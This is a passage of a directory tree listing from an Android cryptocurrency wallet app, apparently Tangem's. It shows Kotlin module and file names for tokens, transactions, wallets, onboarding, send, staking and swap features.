│   │       │                       │   ├── TokenActionsState.kt
│   │       │                       │   ├── TokenList.kt
│   │       │                       │   └── TotalFiatBalance.kt
│   │       │                       ├── operations
│   │       │                       │   ├── CurrenciesStatusesLceOperations.kt
│   │       │                       │   ├── CurrenciesStatusesOperations.kt
│   │       │                       │   ├── CurrencyStatusOperations.kt
│   │       │                       │   ├── TokenListFiatBalanceOperations.kt
│   │       │                       │   ├── TokenListOperations.kt
│   │       │                       │   └── TokenListSortingOperations.kt
│   │       │                       ├── RemoveCurrencyUseCase.kt
│   │       │                       ├── repository
│   │       │                       │   ├── CurrenciesRepository.kt
│   │       │                       │   ├── CurrencyChecksRepository.kt
│   │       │                       │   ├── MarketCryptoCurrencyRepository.kt
│   │       │                       │   ├── NetworksCompatibilityRepository.kt
│   │       │                       │   ├── NetworksRepository.kt
│   │       │                       │   ├── PolkadotAccountHealthCheckRepository.kt
│   │       │                       │   ├── PromoRepository.kt
│   │       │                       │   ├── QuotesRepository.kt
│   │       │                       │   └── TokensListRepository.kt
│   │       │                       ├── RequiresHardenedDerivationOnlyUseCase.kt
│   │       │                       ├── RunPolkadotAccountHealthCheckUseCase.kt
│   │       │                       ├── ToggleTokenListGroupingUseCase.kt
│   │       │                       ├── ToggleTokenListSortingUseCase.kt
│   │       │                       ├── UpdateDelayedNetworkStatusUseCase.kt
│   │       │                       └── ValidateContractAddressUseCase.kt
│   │       └── test
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── tokens
│   │                               ├── ApplyTokenListSortingUseCaseTest.kt
│   │                               ├── GetPrimaryCurrencyStatusUpdatesUseCaseTest.kt
│   │                               ├── GetTokenListUseCaseTest.kt
│   │                               ├── mock
│   │                               │   ├── MockNetworksGroups.kt
│   │                               │   ├── MockNetworks.kt
│   │                               │   ├── MockQuotes.kt
│   │                               │   ├── MockTokenLists.kt
│   │                               │   ├── MockTokens.kt
│   │                               │   └── MockTokensStates.kt
│   │                               ├── repository
│   │                               │   ├── MockCurrenciesRepository.kt
│   │                               │   ├── MockNetworksRepository.kt
│   │                               │   └── MockQuotesRepository.kt
│   │                               ├── ToggleTokenListGroupingTest.kt
│   │                               └── ToggleTokenListSortingUseCaseTest.kt
│   ├── transaction
│   │   ├── build.gradle.kts
│   │   ├── models
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── domain
│   │   │                           └── transaction
│   │   │                               └── models
│   │   │                                   └── AssetRequirementsCondition.kt
│   │   └── src
│   │       └── main
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── transaction
│   │                               ├── error
│   │                               │   ├── AssociateAssetError.kt
│   │                               │   ├── GetFeeError.kt
│   │                               │   └── SendTransactionError.kt
│   │                               ├── FeeRepository.kt
│   │                               ├── TransactionRepository.kt
│   │                               └── usecase
│   │                                   ├── AssociateAssetUseCase.kt
│   │                                   ├── CreateTransactionUseCase.kt
│   │                                   ├── EstimateFeeUseCase.kt
│   │                                   ├── GetFeeUseCase.kt
│   │                                   ├── IsFeeApproximateUseCase.kt
│   │                                   ├── SendTransactionUseCase.kt
│   │                                   └── ValidateTransactionUseCase.kt
│   ├── txhistory
│   │   ├── build.gradle.kts
│   │   ├── models
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── domain
│   │   │                           └── txhistory
│   │   │                               └── models
│   │   │                                   ├── Page.kt
│   │   │                                   ├── PaginationWrapper.kt
│   │   │                                   ├── TxHistoryItem.kt
│   │   │                                   ├── TxHistoryListError.kt
│   │   │                                   ├── TxHistoryStateError.kt
│   │   │                                   ├── TxHistoryState.kt
│   │   │                                   └── TxStatusError.kt
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── txhistory
│   │                               ├── repository
│   │                               │   └── TxHistoryRepository.kt
│   │                               └── usecase
│   │                                   ├── GetExplorerTransactionUrlUseCase.kt
│   │                                   ├── GetFixedTxHistoryItemsUseCase.kt
│   │                                   ├── GetTxHistoryItemsCountUseCase.kt
│   │                                   └── GetTxHistoryItemsUseCase.kt
│   ├── visa
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── visa
│   │                               ├── GetVisaCurrencyUseCase.kt
│   │                               ├── GetVisaTxDetailsUseCase.kt
│   │                               ├── GetVisaTxHistoryUseCase.kt
│   │                               ├── model
│   │                               │   ├── VisaCurrency.kt
│   │                               │   ├── VisaTxDetails.kt
│   │                               │   └── VisaTxHistoryItem.kt
│   │                               └── repository
│   │                                   └── VisaRepository.kt
│   ├── wallet-connect
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           └── kotlin
│   │               └── com
│   │                   └── tangem
│   │                       └── domain
│   │                           └── walletconnect
│   │                               ├── CheckIsWalletConnectAvailableUseCase.kt
│   │                               └── repository
│   │                                   └── WalletConnectRepository.kt
│   └── wallets
│       ├── build.gradle.kts
│       ├── models
│       │   ├── build.gradle.kts
│       │   └── src
│       │       └── main
│       │           └── java
│       │               └── com
│       │                   └── tangem
│       │                       └── domain
│       │                           └── wallets
│       │                               └── models
│       │                                   ├── errors
│       │                                   │   └── ParsedQrCodeErrors.kt
│       │                                   ├── ParsedQrCode.kt
│       │                                   ├── UserWalletId.kt
│       │                                   └── UserWallet.kt
│       └── src
│           └── main
│               └── java
│                   └── com
│                       └── tangem
│                           └── domain
│                               └── wallets
│                                   ├── builder
│                                   │   ├── UserWalletBuilder.kt
│                                   │   └── UserWalletIdBuilder.kt
│                                   ├── legacy
│                                   │   ├── UserWalletsListError.kt
│                                   │   ├── UserWalletsListManagerExtensions.kt
│                                   │   └── UserWalletsListManager.kt
│                                   ├── models
│                                   │   ├── Artwork.kt
│                                   │   ├── DeleteWalletError.kt
│                                   │   ├── GetUserWalletError.kt
│                                   │   ├── SaveWalletError.kt
│                                   │   ├── SelectWalletError.kt
│                                   │   ├── UnlockWalletsError.kt
│                                   │   └── UpdateWalletError.kt
│                                   ├── repository
│                                   │   ├── WalletAddressServiceRepository.kt
│                                   │   ├── WalletNamesMigrationRepository.kt
│                                   │   └── WalletsRepository.kt
│                                   └── usecase
│                                       ├── DeleteWalletUseCase.kt
│                                       ├── GenerateWalletNameUseCase.kt
│                                       ├── GetCardImageUseCase.kt
│                                       ├── GetExploreUrlUseCase.kt
│                                       ├── GetSelectedWalletSyncUseCase.kt
│                                       ├── GetSelectedWalletUseCase.kt
│                                       ├── GetUserWalletUseCase.kt
│                                       ├── GetWalletNamesUseCase.kt
│                                       ├── GetWalletsUseCase.kt
│                                       ├── IsNeedToBackupUseCase.kt
│                                       ├── ParseSharedAddressUseCase.kt
│                                       ├── RenameWalletUseCase.kt
│                                       ├── SaveWalletUseCase.kt
│                                       ├── SelectWalletUseCase.kt
│                                       ├── ShouldSaveUserWalletsSyncUseCase.kt
│                                       ├── ShouldSaveUserWalletsUseCase.kt
│                                       ├── UnlockWalletsUseCase.kt
│                                       ├── UpdateWalletUseCase.kt
│                                       ├── ValidateWalletAddressUseCase.kt
│                                       └── ValidateWalletMemoUseCase.kt
├── fastlane
│   ├── Appfile
│   ├── Fastfile
│   ├── Pluginfile
│   └── README.md
├── features
│   ├── details
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── details
│   │   │                               ├── DetailsEntryPoint.kt
│   │   │                               └── DetailsFeatureToggles.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               ├── kotlin
│   │               │   └── com
│   │               │       └── tangem
│   │               │           └── features
│   │               │               └── details
│   │               │                   ├── component
│   │               │                   │   ├── DetailsComponent.kt
│   │               │                   │   ├── preview
│   │               │                   │   │   ├── PreviewDetailsComponent.kt
│   │               │                   │   │   ├── PreviewUserWalletListComponent.kt
│   │               │                   │   │   └── PreviewWalletConnectComponent.kt
│   │               │                   │   ├── UserWalletListComponent.kt
│   │               │                   │   └── WalletConnectComponent.kt
│   │               │                   ├── DefaultDetailsFeatureToggles.kt
│   │               │                   ├── DetailsFragment.kt
│   │               │                   ├── di
│   │               │                   │   ├── FeatureModule.kt
│   │               │                   │   └── ModelModule.kt
│   │               │                   ├── entity
│   │               │                   │   ├── DetailsFooterUM.kt
│   │               │                   │   ├── DetailsItemUM.kt
│   │               │                   │   ├── DetailsUM.kt
│   │               │                   │   └── UserWalletListUM.kt
│   │               │                   ├── model
│   │               │                   │   └── DetailsModel.kt
│   │               │                   ├── ui
│   │               │                   │   ├── BlockCard.kt
│   │               │                   │   ├── BlockItem.kt
│   │               │                   │   ├── DetailsScreen.kt
│   │               │                   │   ├── UserWalletListBlock.kt
│   │               │                   │   └── WalletConnectBlock.kt
│   │               │                   └── utils
│   │               │                       ├── ItemsBuilder.kt
│   │               │                       └── SocialsBuilder.kt
│   │               └── res
│   │                   └── drawable
│   │                       ├── ill_card_note_bnb_211_343.png
│   │                       ├── ill_card_note_eth_211_343.png
│   │                       └── ill_card_wallet_2_211_343.png
│   ├── manage-tokens
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── managetokens
│   │   │                               ├── featuretoggles
│   │   │                               │   └── ManageTokensFeatureToggles.kt
│   │   │                               └── navigation
│   │   │                                   ├── ExpandableState.kt
│   │   │                                   └── ManageTokensUi.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               └── java
│   │                   └── com
│   │                       └── tangem
│   │                           └── managetokens
│   │                               ├── di
│   │                               │   ├── ManageTokensFeatureTogglesModule.kt
│   │                               │   └── ManageTokensRouterModule.kt
│   │                               ├── featuretoggles
│   │                               │   └── DefaultManageTokensFeatureToggles.kt
│   │                               └── presentation
│   │                                   ├── addcustomtoken
│   │                                   │   ├── router
│   │                                   │   │   ├── AddCustomTokenRoute.kt
│   │                                   │   │   └── AddCustomTokenRouter.kt
│   │                                   │   ├── state
│   │                                   │   │   ├── AddCustomTokenState.kt
│   │                                   │   │   ├── AddCustomTokenWarning.kt
│   │                                   │   │   ├── ButtonState.kt
│   │                                   │   │   ├── ChooseDerivationState.kt
│   │                                   │   │   ├── ChooseNetworkState.kt
│   │                                   │   │   ├── CustomTokenData.kt
│   │                                   │   │   ├── Derivation.kt
│   │                                   │   │   ├── EnterCustomDerivationState.kt
│   │                                   │   │   ├── factory
│   │                                   │   │   │   ├── AddCustomTokenStateFactory.kt
│   │                                   │   │   │   ├── AddCustomTokenStateToCryptoCurrencyConverter.kt
│   │                                   │   │   │   ├── ContractAddressToCustomTokenDataConverter.kt
│   │                                   │   │   │   ├── FoundTokenToCustomTokenDataConverter.kt
│   │                                   │   │   │   └── NetworkToNetworkItemStateConverter.kt
│   │                                   │   │   ├── previewdata
│   │                                   │   │   │   ├── AddCustomTokenPreviewData.kt
│   │                                   │   │   │   ├── ChooseDerivationPreviewData.kt
│   │                                   │   │   │   └── ChooseNetworkCustomPreviewData.kt
│   │                                   │   │   └── TextFieldState.kt
│   │                                   │   ├── ui
│   │                                   │   │   ├── AddCustomTokenBottomSheet.kt
│   │                                   │   │   ├── AddCustomTokenScreen.kt
│   │                                   │   │   ├── ChooseDerivationScreen.kt
│   │                                   │   │   ├── ChooseNetworkCustomScreen.kt
│   │                                   │   │   ├── CustomDerivationDialog.kt
│   │                                   │   │   ├── CustomTokenChooseWalletScreen.kt
│   │                                   │   │   └── TokenTextField.kt
│   │                                   │   └── viewmodels
│   │                                   │       ├── AddCustomTokenClickIntents.kt
│   │                                   │       └── AddCustomTokenViewModel.kt
│   │                                   ├── common
│   │                                   │   ├── analytics
│   │                                   │   │   └── ManageTokens.kt
│   │                                   │   ├── state
│   │                                   │   │   ├── AlertState.kt
│   │                                   │   │   ├── ChooseWalletState.kt
│   │                                   │   │   ├── Event.kt
│   │                                   │   │   ├── NetworkItemState.kt
│   │                                   │   │   ├── previewdata
│   │                                   │   │   │   └── ChooseWalletStatePreviewData.kt
│   │                                   │   │   └── WalletState.kt
│   │                                   │   ├── ui
│   │                                   │   │   ├── ChooseWalletBottomSheet.kt
│   │                                   │   │   ├── ChooseWalletScreen.kt
│   │                                   │   │   ├── components
│   │                                   │   │   │   ├── Alert.kt
│   │                                   │   │   │   ├── NetworkItem.kt
│   │                                   │   │   │   └── SimpleSelectionBlock.kt
│   │                                   │   │   └── EventEffect.kt
│   │                                   │   └── utils
│   │                                   │       └── CurrencyUtils.kt
│   │                                   ├── managetokens
│   │                                   │   ├── state
│   │                                   │   │   ├── ChooseNetworkState.kt
│   │                                   │   │   ├── DerivationNotificationState.kt
│   │                                   │   │   ├── factory
│   │                                   │   │   │   ├── ManageTokensStateFactory.kt
│   │                                   │   │   │   ├── NetworksToChooseNetworkStateConverter.kt
│   │                                   │   │   │   ├── NetworkToNetworkItemStateConverter.kt
│   │                                   │   │   │   ├── QuotesToQuotesStateConverter.kt
│   │                                   │   │   │   ├── TokenConverter.kt
│   │                                   │   │   │   └── TokenToCryptoCurrencyConverter.kt
│   │                                   │   │   ├── ManageTokensState.kt
│   │                                   │   │   ├── previewdata
│   │                                   │   │   │   ├── ChooseNetworkStatePreviewData.kt
│   │                                   │   │   │   ├── DerivationNotificationStatePreviewData.kt
│   │                                   │   │   │   ├── ManageTokensStatePreviewData.kt
│   │                                   │   │   │   └── TokenItemStatePreviewData.kt
│   │                                   │   │   ├── QuotesState.kt
│   │                                   │   │   ├── SearchBarState.kt
│   │                                   │   │   ├── TokenButtonType.kt
│   │                                   │   │   ├── TokenIconState.kt
│   │                                   │   │   └── TokenItemState.kt
│   │                                   │   ├── ui
│   │                                   │   │   ├── ChooseNetworkBottomSheet.kt
│   │                                   │   │   ├── ChooseNetworkScreen.kt
│   │                                   │   │   ├── components
│   │                                   │   │   │   ├── AddCustomTokenButton.kt
│   │                                   │   │   │   ├── DerivationNotification.kt
│   │                                   │   │   │   ├── PriceChangesChart.kt
│   │                                   │   │   │   ├── SearchBar.kt
│   │                                   │   │   │   ├── TokenButton.kt
│   │                                   │   │   │   ├── TokenIcon.kt
│   │                                   │   │   │   ├── TokenPriceChange.kt
│   │                                   │   │   │   ├── TokenRowItem.kt
│   │                                   │   │   │   └── TokensList.kt
│   │                                   │   │   └── ManageTokensScreen.kt
│   │                                   │   └── viewmodels
│   │                                   │       ├── ManageTokensClickIntents.kt
│   │                                   │       ├── ManageTokensUiEvents.kt
│   │                                   │       └── ManageTokensViewModel.kt
│   │                                   └── router
│   │                                       └── ManageTokensUiImpl.kt
│   ├── onboarding
│   │   ├── build.gradle.kts
│   │   └── src
│   │       └── main
│   │           ├── assets
│   │           │   └── mnemonic
│   │           │       └── mnemonic_dictionary_en.txt
│   │           └── java
│   │               └── com
│   │                   └── tangem
│   │                       └── feature
│   │                           └── onboarding
│   │                               ├── api
│   │                               │   ├── OnboardingSeedPhraseApi.kt
│   │                               │   └── OnboardingSeedPhraseScreen.kt
│   │                               ├── data
│   │                               │   ├── DefaultMnemonicRepository.kt
│   │                               │   ├── MnemonicRepository.kt
│   │                               │   └── model
│   │                               │       └── CreateWalletResponse.kt
│   │                               ├── di
│   │                               │   └── OnboardingRouterModule.kt
│   │                               ├── domain
│   │                               │   ├── DefaultSeedPhraseInteractor.kt
│   │                               │   ├── di
│   │                               │   │   └── OnboardingDomainModule.kt
│   │                               │   ├── models
│   │                               │   │   └── MnemonicType.kt
│   │                               │   ├── OnboardingModuleError.kt
│   │                               │   ├── PartWordFinder.kt
│   │                               │   └── SeedPhraseInteractor.kt
│   │                               ├── navigation
│   │                               │   ├── DefaultOnboardingRouter.kt
│   │                               │   └── OnboardingRouter.kt
│   │                               └── presentation
│   │                                   └── wallet2
│   │                                       ├── analytics
│   │                                       │   └── SeedPhraseEvents.kt
│   │                                       ├── model
│   │                                       │   ├── ButtonState.kt
│   │                                       │   ├── DescriptionResource.kt
│   │                                       │   ├── OnboardingSeedPhraseState.kt
│   │                                       │   └── UiActions.kt
│   │                                       ├── ui
│   │                                       │   ├── AboutSeedPhraseScreen.kt
│   │                                       │   ├── CheckSeedPhraseScreen.kt
│   │                                       │   ├── components
│   │                                       │   │   ├── OnboardingActionBlock.kt
│   │                                       │   │   └── OnboardingDescriptionBlock.kt
│   │                                       │   ├── ImportSeedPhraseScreen.kt
│   │                                       │   ├── IntroScreen.kt
│   │                                       │   ├── PassphraseInfoBottomSheet.kt
│   │                                       │   ├── stateBuiders
│   │                                       │   │   ├── CheckSeedPhraseStateBuilder.kt
│   │                                       │   │   ├── ImportSeedPhraseStateBuilder.kt
│   │                                       │   │   └── StateBuilder.kt
│   │                                       │   └── YourSeedPhraseScreen.kt
│   │                                       └── viewmodel
│   │                                           ├── InvalidWordsColorTransformation.kt
│   │                                           ├── SeedPhraseErrorConverter.kt
│   │                                           ├── SeedPhraseMediator.kt
│   │                                           ├── SeedPhraseRouter.kt
│   │                                           └── SeedPhraseViewModel.kt
│   ├── qr-scanning
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── qrscanning
│   │   │                               └── QrScanningRouter.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       ├── proguard-rules.pro
│   │       └── src
│   │           └── main
│   │               └── java
│   │                   └── com
│   │                       └── tangem
│   │                           └── feature
│   │                               └── qrscanning
│   │                                   ├── di
│   │                                   │   └── QrScanningRouterModule.kt
│   │                                   ├── inner
│   │                                   │   └── MLKitBarcodeAnalyzer.kt
│   │                                   ├── navigation
│   │                                   │   ├── DefaultQrScanningRouter.kt
│   │                                   │   └── QrScanningInnerRouter.kt
│   │                                   ├── presentation
│   │                                   │   ├── CameraDeniedBottomSheetConfig.kt
│   │                                   │   ├── CameraView.kt
│   │                                   │   ├── QrScanningCameraDeniedBottomSheet.kt
│   │                                   │   ├── QrScanningContent.kt
│   │                                   │   ├── QrScanningStateController.kt
│   │                                   │   ├── QrScanningState.kt
│   │                                   │   └── transformers
│   │                                   │       ├── DismissBottomSheetTransformer.kt
│   │                                   │       ├── InitializeQrScanningStateTransformer.kt
│   │                                   │       ├── QrScanningTransformer.kt
│   │                                   │       └── ShowCameraDeniedBottomSheetTransformer.kt
│   │                                   ├── QrScanningFragment.kt
│   │                                   └── viewmodel
│   │                                       ├── BaseQrScanningClickIntents.kt
│   │                                       ├── QrScanningClickIntents.kt
│   │                                       └── QrScanningViewModel.kt
│   ├── referral
│   │   ├── data
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── referral
│   │   │                               ├── converters
│   │   │                               │   └── ReferralConverter.kt
│   │   │                               ├── data
│   │   │                               │   └── ReferralRepositoryImpl.kt
│   │   │                               └── di
│   │   │                                   └── ReferralRepositoryModule.kt
│   │   ├── domain
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── referral
│   │   │                               └── domain
│   │   │                                   ├── di
│   │   │                                   │   └── ReferralDomainModule.kt
│   │   │                                   ├── models
│   │   │                                   │   └── ReferralData.kt
│   │   │                                   ├── ReferralInteractorImpl.kt
│   │   │                                   ├── ReferralInteractor.kt
│   │   │                                   └── ReferralRepository.kt
│   │   └── presentation
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               └── java
│   │                   └── com
│   │                       └── tangem
│   │                           └── feature
│   │                               └── referral
│   │                                   ├── analytics
│   │                                   │   └── ReferralEvents.kt
│   │                                   ├── models
│   │                                   │   ├── DemoModeException.kt
│   │                                   │   └── ReferralStateHolder.kt
│   │                                   ├── ReferralFragment.kt
│   │                                   ├── router
│   │                                   │   └── ReferralRouter.kt
│   │                                   ├── ui
│   │                                   │   ├── AgreementBottomSheetContent.kt
│   │                                   │   ├── AgreementText.kt
│   │                                   │   ├── AwardItems.kt
│   │                                   │   ├── CornersToRound.kt
│   │                                   │   ├── NonParticipateBottomBlock.kt
│   │                                   │   ├── ParticipateBottomBlock.kt
│   │                                   │   ├── ReferralBottomSheet.kt
│   │                                   │   └── ReferralScreen.kt
│   │                                   └── viewmodels
│   │                                       └── ReferralViewModel.kt
│   ├── send
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── send
│   │   │                               └── api
│   │   │                                   ├── featuretoggles
│   │   │                                   │   └── SendFeatureToggles.kt
│   │   │                                   └── navigation
│   │   │                                       └── SendRouter.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               ├── java
│   │               │   └── com
│   │               │       └── tangem
│   │               │           └── features
│   │               │               └── send
│   │               │                   └── impl
│   │               │                       ├── di
│   │               │                       │   ├── SendFeatureTogglesModule.kt
│   │               │                       │   └── SendRouterModule.kt
│   │               │                       ├── featuretoggles
│   │               │                       │   └── DefaultSendFeatureToggles.kt
│   │               │                       ├── navigation
│   │               │                       │   ├── DefaultSendRouter.kt
│   │               │                       │   └── InnerSendRouter.kt
│   │               │                       └── presentation
│   │               │                           ├── analytics
│   │               │                           │   ├── SendAnalyticEvents.kt
│   │               │                           │   └── utils
│   │               │                           │       └── SendScreenAnalyticSender.kt
│   │               │                           ├── domain
│   │               │                           │   ├── AvailableWallet.kt
│   │               │                           │   └── SendRecipientListContent.kt
│   │               │                           ├── SendFragment.kt
│   │               │                           ├── state
│   │               │                           │   ├── amount
│   │               │                           │   │   ├── AmountStateFactory.kt
│   │               │                           │   │   ├── AmountUtils.kt
│   │               │                           │   │   ├── SendAmountCurrencyConverter.kt
│   │               │                           │   │   ├── SendAmountPastedTriggerDismissConverter.kt
│   │               │                           │   │   ├── SendAmountReduceByConverter.kt
│   │               │                           │   │   ├── SendAmountReduceToConverter.kt
│   │               │                           │   │   ├── SendAmountSegmentedButtonsConfig.kt
│   │               │                           │   │   └── SendAmountStateConverter.kt
│   │               │                           │   ├── common
│   │               │                           │   │   └── SendSyncEditConverter.kt
│   │               │                           │   ├── confirm
│   │               │                           │   │   ├── SendConfirmStateConverter.kt
│   │               │                           │   │   └── SendNotificationFactory.kt
│   │               │                           │   ├── fee
│   │               │                           │   │   ├── custom
│   │               │                           │   │   │   ├── BitcoinCustomFeeConverter.kt
│   │               │                           │   │   │   ├── CustomFeeConverter.kt
│   │               │                           │   │   │   └── EthereumCustomFeeConverter.kt
│   │               │                           │   │   ├── FeeCalculation.kt
│   │               │                           │   │   ├── FeeConverter.kt
│   │               │                           │   │   ├── FeeNotificationFactory.kt
│   │               │                           │   │   ├── FeeSelectorState.kt
│   │               │                           │   │   ├── FeeStateFactory.kt
│   │               │                           │   │   ├── SendFeeCustomFieldConverter.kt
│   │               │                           │   │   └── SendFeeStateConverter.kt
│   │               │                           │   ├── fields
│   │               │                           │   │   ├── SendAmountFieldChangeConverter.kt
│   │               │                           │   │   ├── SendAmountFieldConverter.kt
│   │               │                           │   │   ├── SendAmountFieldMaxAmountConverter.kt
│   │               │                           │   │   └── SendTextField.kt
│   │               │                           │   ├── previewdata
│   │               │                           │   │   ├── AmountStatePreviewData.kt
│   │               │                           │   │   ├── ConfirmStatePreviewData.kt
│   │               │                           │   │   ├── FeeStatePreviewData.kt
│   │               │                           │   │   ├── RecipientStatePreviewData.kt
│   │               │                           │   │   ├── SendClickIntentsStub.kt
│   │               │                           │   │   └── SendStatesPreviewData.kt
│   │               │                           │   ├── recipient
│   │               │                           │   │   ├── RecipientSendFactory.kt
│   │               │                           │   │   ├── SendRecipientAddressFieldConverter.kt
│   │               │                           │   │   ├── SendRecipientHistoryListConverter.kt
│   │               │                           │   │   ├── SendRecipientMemoFieldConverter.kt
│   │               │                           │   │   ├── SendRecipientStateConverter.kt
│   │               │                           │   │   ├── SendRecipientWalletListConverter.kt
│   │               │                           │   │   └── utils
│   │               │                           │   │       └── RecentListUtils.kt
│   │               │                           │   ├── SendAlertState.kt
│   │               │                           │   ├── SendEvent.kt
│   │               │                           │   ├── SendEventStateFactory.kt
│   │               │                           │   ├── SendNotification.kt
│   │               │                           │   ├── SendStateFactory.kt
│   │               │                           │   ├── SendTransactionAlertConverter.kt
│   │               │                           │   ├── SendUiState.kt
│   │               │                           │   └── StateRouter.kt
│   │               │                           ├── ui
│   │               │                           │   ├── amount
│   │               │                           │   │   ├── AmountButtons.kt
│   │               │                           │   │   ├── AmountFieldContainer.kt
│   │               │                           │   │   ├── AmountField.kt
│   │               │                           │   │   └── SendAmountContent.kt
│   │               │                           │   ├── common
│   │               │                           │   │   ├── FooterContainer.kt
│   │               │                           │   │   └── Notifications.kt
│   │               │                           │   ├── fee
│   │               │                           │   │   ├── SendCustomFee.kt
│   │               │                           │   │   ├── SendSpeedAndFeeContent.kt
│   │               │                           │   │   ├── SendSpeedSelectorItem.kt
│   │               │                           │   │   └── SendSpeedSelector.kt
│   │               │                           │   ├── recipient
│   │               │                           │   │   ├── ListItemWithIcon.kt
│   │               │                           │   │   ├── SendRecipientContent.kt
│   │               │                           │   │   └── TextFieldWithPaste.kt
│   │               │                           │   ├── send
│   │               │                           │   │   ├── AmountBlock.kt
│   │               │                           │   │   ├── FeeBlock.kt
│   │               │                           │   │   ├── RecipientBlock.kt
│   │               │                           │   │   └── SendContent.kt
│   │               │                           │   ├── SendEventEffect.kt
│   │               │                           │   ├── SendNavigationButtons.kt
│   │               │                           │   └── SendScreen.kt
│   │               │                           ├── utils
│   │               │                           │   └── FormatterUtils.kt
│   │               │                           └── viewmodel
│   │               │                               ├── SendClickIntents.kt
│   │               │                               └── SendViewModel.kt
│   │               └── res
│   │                   └── drawable
│   │                       └── send_hint_shape_12.xml
│   ├── staking
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── kotlin
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── features
│   │   │                           └── staking
│   │   │                               └── api
│   │   │                                   ├── featuretoggles
│   │   │                                   │   └── StakingFeatureToggles.kt
│   │   │                                   └── navigation
│   │   │                                       └── StakingRouter.kt
│   │   └── impl
│   │       ├── build.gradle.kts
│   │       └── src
│   │           └── main
│   │               └── java
│   │                   └── com
│   │                       └── tangem
│   │                           └── features
│   │                               └── staking
│   │                                   └── impl
│   │                                       ├── di
│   │                                       │   ├── StakingFeatureTogglesModule.kt
│   │                                       │   └── StakingRouterModule.kt
│   │                                       ├── featuretoggles
│   │                                       │   └── DefaultStakingFeatureToggles.kt
│   │                                       └── navigation
│   │                                           ├── DefaultStakingRouter.kt
│   │                                           └── InnerStakingRouter.kt
│   ├── swap
│   │   ├── api
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── swap
│   │   │                               └── api
│   │   │                                   └── SwapFeatureToggleManager.kt
│   │   ├── data
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── feature
│   │   │                           └── swap
│   │   │                               ├── converters
│   │   │                               │   ├── ErrorsDataConverter.kt
│   │   │                               │   ├── ExchangeStatusConverter.kt
│   │   │                               │   ├── ExpressDataConverter.kt
│   │   │                               │   ├── LeastTokenInfoConverter.kt
│   │   │                               │   ├── RateTypeConverter.kt
│   │   │                               │   ├── SavedSwapTransactionListConverter.kt
│   │   │                               │   └── SwapPairInfoConverter.kt
│   │   │                               ├── DefaultSwapRepository.kt
│   │   │                               ├── DefaultSwapTransactionRepository.kt
│   │   │                               └── di
│   │   │                                   └── SwapDataModule.kt
│   │   ├── domain
│   │   │   ├── api
│   │   │   │   ├── build.gradle.kts
│   │   │   │   └── src
│   │   │   │       └── main
│   │   │   │           └── java
│   │   │   │               └── com
│   │   │   │                   └── tangem
│   │   │   │                       └── feature
│   │   │   │                           └── swap
│   │   │   │                               └── domain
│   │   │   │                                   └── api
│   │   │   │                                       └── SwapRepository.kt
│   │   │   ├── build.gradle.kts
│   │   │   ├── models
│   │   │   │   ├── build.gradle.kts
│   │   │   │   └── src
│   │   │   │       └── main
│   │   │   │           └── java
│   │   │   │               └── com
│   │   │   │                   └── tangem
│   │   │   │                       └── feature
│   │   │   │                           └── swap
│   │   │   │                               └── domain
│   │   │   │                                   └── models
│   │   │   │                                       ├── DataError.kt
│   │   │   │                                       ├── domain
│   │   │   │                                       │   ├── Currency.kt
│   │   │   │                                       │   ├── ExchangeQuote.kt
│   │   │   │                                       │   ├── ExchangeStatus.kt
│   │   │   │                                       │   ├── ExpressTransactionModel.kt
│   │   │   │                                       │   ├── LeastTokenInfo.kt
│   │   │   │                                       │   ├── NetworkInfo.kt
│   │   │   │                                       │   ├── PairsWithProviders.kt
│   │   │   │                                       │   ├── PermissionOptions.kt
│   │   │   │                                       │   ├── PreparedSwapConfigState.kt
│   │   │   │                                       │   ├── QuoteModel.kt
│   │   │   │                                       │   ├── SavedLastSwappedCryptoCurrency.kt
